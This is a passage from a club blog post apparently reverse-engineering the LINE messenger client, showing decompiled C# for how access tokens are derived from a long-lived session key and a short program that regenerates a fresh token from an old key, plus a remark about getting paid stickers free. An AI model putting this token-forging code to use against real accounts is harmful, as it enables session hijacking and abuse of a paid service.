send()</span><br></pre></td></tr></table></figure>
<p>I can also figure out how to send an emoticon message through LINE. I wish I can send some emoticons, which I have to buy to use them, but it doesn’t worked with an error message <strong>“current user does not have this sticker”</strong> :(</p>
<p>ps. you can send some charged emoticons in LOCO protocol for nothing :)</p>
<p align="center"> <img src="/img/line11.png" style="width: 90%;"> </p>


<h1 id="Session_key">Session key</h1><p>Finally, I want to talk about session key  and auth key.</p>
<h2 id="5-_Session_key">5. Session key</h2><p>At first, I tried to follow UpdateAuthToken() function because this function adds the <code>X-Line-Access</code> header to the HTTP protocol. As I followed this function, I finally arrived to create() function which updates the old session key. It wasn’t hard to understand how this function updates authKey, but I couldn’t figure out when LINE change an auth key.</p>
<p>It seems like LINE’s session key is changed when a user change his/her mobile phone or re-install the application. In other words, the session key <strong>won’t be changed</strong> if you don’t erase or change your mobile phone. This can cause security problems if someone change the code of LINE application and distribute it to the internet…but I don’t think it will happen :)</p>
<p>Bellow is the list of functions that I followed to find out how LINE update their authorization key.</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UpdateAuthToken</span>(<span class="params"><span class="keyword">string</span> authKey</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (authKey != <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._transport.AddRequestHeader(<span class="string">"X-Line-Access"</span>, AccessTokenHelper.GetAccessToken(authKey)); <span class="comment">// add "X-Line-Access" header to HTTP(s) protocol</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UpdateAuthToken</span>(<span class="params"><span class="keyword">string</span> authKey</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (authKey != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._transport.AddRequestHeader(<span class="string">"X-Line-Access"</span>, AccessTokenHelper.GetAccessToken(authKey)); <span class="comment">// add "X-Line-Access" header to HTTP(s) protocol</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> _addCustomHeader(HttpWebRequest httpWebRequest)</span><br><span class="line">&#123;</span><br><span class="line">    Profile current = ProfileViewModel.GetInstance().Current;</span><br><span class="line">    httpWebRequest.get_Headers().set_Item(<span class="string">"X-Line-Access"</span>, AccessTokenHelper.GetAccessToken(current.AuthKey)); <span class="comment">// add "X-Line-Access" header to HTTP(s) protocol</span></span><br><span class="line">    httpWebRequest.get_Headers().set_Item(<span class="string">"X-Line-Application"</span>, DeviceUtility.GetLineApplicationString());</span><br><span class="line">    httpWebRequest.get_Headers().set_Item(<span class="string">"Cache-Control"</span>, <span class="string">"no-cache"</span>);</span><br><span class="line">    httpWebRequest.get_Headers().set_Item(<span class="string">"Pragma"</span>, <span class="string">"no-cache"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">GetAccessToken</span>(<span class="params"><span class="keyword">string</span> authKey</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> timestamp = (DateTime.get_UtcNow() - <span class="keyword">new</span> DateTime(<span class="number">0x7b2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)).get_TotalMilliseconds(); <span class="comment">// use time stamp for making access token</span></span><br><span class="line">    <span class="keyword">return</span> GetAccessToken(timestamp, authKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">GetAccessToken</span>(<span class="params"><span class="keyword">long</span> timestamp, <span class="keyword">string</span> authKey</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (((_accessToken == <span class="string">""</span>) || !_accessToken.Equals(_lastAuthToken)) || (timestamp &gt; (_lastUpdated + <span class="number">0x5265c00</span>L)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">lock</span> (_thisLock)</span><br><span class="line">        &#123;</span><br><span class="line">            _accessToken = Generate(authKey, timestamp);</span><br><span class="line">            _lastUpdated = timestamp;</span><br><span class="line">            _lastAuthToken = authKey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _accessToken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Generate</span>(<span class="params"><span class="keyword">string</span> authToken, <span class="keyword">long</span> timestamp</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span>[] strArray = authToken.Split(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">':'</span> &#125;);</span><br><span class="line">    <span class="keyword">if</span> (strArray.Length != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">"authToken"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">string</span> issueTo = strArray[<span class="number">0</span>]; <span class="comment">// use previous authToken for the new authToken</span></span><br><span class="line">    <span class="keyword">string</span> encodedSecretKey = strArray[<span class="number">1</span>]; <span class="comment">// use previous authToken for the new authToken</span></span><br><span class="line">    <span class="keyword">string</span> str3 = YamlWebToken.Create(issueTo, timestamp, encodedSecretKey);</span><br><span class="line">    <span class="keyword">return</span> (issueTo + <span class="string">":"</span> + str3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">YamlWebToken</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Fields</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HmacAlgorithm DEFAULT_ALOGORITHM; <span class="comment">// use Hmac algorith for generating token</span></span><br><span class="line">    <span class="comment">// Methods</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="title">YamlWebToken</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YamlWebToken</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Create</span>(<span class="params"><span class="keyword">string</span> issueTo, <span class="keyword">long</span> timestamp, <span class="keyword">string</span> encodedSecretKey</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Create</span>(<span class="params"><span class="keyword">string</span> issuedTo, <span class="keyword">long</span> timestamp, <span class="keyword">string</span> encodedSecretKey, HmacAlgorithm algorithm</span>)</span>;</span><br><span class="line">    <span class="comment">// Nested Types</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HmacAlgorithm</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Methods</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">HmacAlgorithm</span>(<span class="params"><span class="keyword">string</span> name</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HMAC <span class="title">CreateInstance</span>(<span class="params"><span class="keyword">string</span> name, <span class="keyword">byte</span>[] key</span>)</span>;</span><br><span class="line">        <span class="comment">// Properties</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Create</span>(<span class="params"><span class="keyword">string</span> issueTo, <span class="keyword">long</span> timestamp, <span class="keyword">string</span> encodedSecretKey</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Create(issueTo, timestamp, encodedSecretKey, DEFAULT_ALOGORITHM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Create</span>(<span class="params"><span class="keyword">string</span> issuedTo, <span class="keyword">long</span> timestamp, <span class="keyword">string</span> encodedSecretKey, HmacAlgorithm algorithm</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// core algorithm to make new session key</span></span><br><span class="line">        <span class="keyword">string</span> str2 = <span class="keyword">string</span>.Format(<span class="string">"iat: &#123;1&#125;\n"</span>, issuedTo, timestamp); </span><br><span class="line">        <span class="keyword">string</span> str3 = Convert.ToBase64String(Encoding.get_UTF8().GetBytes(str2));</span><br><span class="line">        <span class="keyword">string</span> str4 = <span class="keyword">string</span>.Empty;</span><br><span class="line">        <span class="keyword">string</span> str5 = str3 + <span class="string">"."</span> + str4;</span><br><span class="line">        <span class="keyword">byte</span>[] key = Convert.FromBase64String(encodedSecretKey);</span><br><span class="line">        <span class="keyword">string</span> str6 = Convert.ToBase64String(HmacAlgorithm.CreateInstance(algorithm.Name, key).ComputeHash(Encoding.get_UTF8().GetBytes(str5)));</span><br><span class="line">        str = str5 + <span class="string">"."</span> + str6; <span class="comment">// base64(issuedTo) + '..' + Hmac(SecretKey)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Anyway, I wrote an C# code that make updated session key… </p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApplication1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span><br><span class="line">        </span>&#123;</span><br><span class="line">            String issuedTo = <span class="string">"1"</span> ;</span><br><span class="line">            DateTime l = DateTime .UtcNow;</span><br><span class="line">            <span class="keyword">long</span> timestamp = (<span class="keyword">long</span> )((l - <span class="keyword">new</span> DateTime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)).TotalMilliseconds);</span><br><span class="line">            String authToken = <span class="string">"????"</span> <span class="comment">// your old session key</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span>[] strArray = authToken.Split(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">':'</span> &#125;);</span><br><span class="line">            <span class="keyword">string</span> issueTo = strArray[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">string</span> encodedSecretKey = strArray[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> str2 = <span class="keyword">string</span> .Format(<span class="string">"iat: &#123;1&#125;\n"</span>, issuedTo, timestamp);</span><br><span class="line">            <span class="keyword">string</span> str3 = Convert .ToBase64String(Encoding.UTF8.GetBytes(str2));</span><br><span class="line">            <span class="keyword">string</span> str4 = <span class="keyword">string</span> .Empty;</span><br><span class="line">            <span class="keyword">string</span> str5 = str3 + <span class="string">"."</span> + str4;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] key = Convert .FromBase64String(encodedSecretKey);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> str6 = Convert.ToBase64String(LINE.Service.YamlWebToken .HmacAlgorithm.CreateInstance(LINE.Service.YamlWebToken.DEFAULT_ALOGORITHM.Name, key).ComputeHash(Encoding.UTF8.GetBytes(str5)));</span><br><span class="line"></span><br><span class="line">            String str = str5 + <span class="string">"."</span> + str6;  <span class="comment">// base64(issuedTo) + '..' + Hmac(SecretKey)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Author: <a href="http://carpedm20.github.io/" target="_blank" rel="external">carpedm20</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
 </div>

        

        
      </div>

      
  
 V <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      <section class="site-overview">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/img/hexa_logo.png" alt="HeXA" itemprop="image"/>
          <p class="site-author-name" itemprop="name">HeXA</p>
        </div>
        <p class="site-description motion-element" itemprop="description">UNIST Computer Club. Hacker's eXciting Academy</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">6</span>
              <span class="site-state-item-name">posts</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">0</span>
              <span class="site-state-item-name">categories</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">12</span>
              <span class="site-state-item-name">tags</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      

    </div>
  </aside>


    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; &nbsp; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">HeXA</span>
</div>

<div class="powered-by">
  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
  
  

  

    <script type="text/javascript">
      var disqus_shortname = 'hexa-unist';
      var disqus_identifier = 'index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        console.log((document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq));
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  




  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  

  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }
    });
  </script>

  

  
  
  

  

    <script type="text/javascript">
      var disqus_shortname = 'hexa-unist';
      var disqus_identifier = 'index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        console.log((document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq));
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  




  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
